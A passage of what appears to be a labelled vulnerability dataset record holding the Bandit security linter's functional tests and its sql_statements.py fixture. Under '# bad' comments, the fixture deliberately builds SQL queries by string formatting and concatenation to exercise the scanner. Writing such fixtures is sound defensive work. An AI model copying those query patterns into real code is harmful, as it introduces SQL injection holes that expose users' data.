'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 14},\n            'CONFIDENCE': {'LOW': 8, 'MEDIUM': 6}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        }\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "6ce60806ca8a44d8a8b37050539e2b2f9a54b847", "code": "/examples/sql_statements.py/n/nimport sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bad\nquery = \"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val\n\n# bad\ncur.execute(\"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val)\n\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n/n/n/n/tests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 12},\n            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, 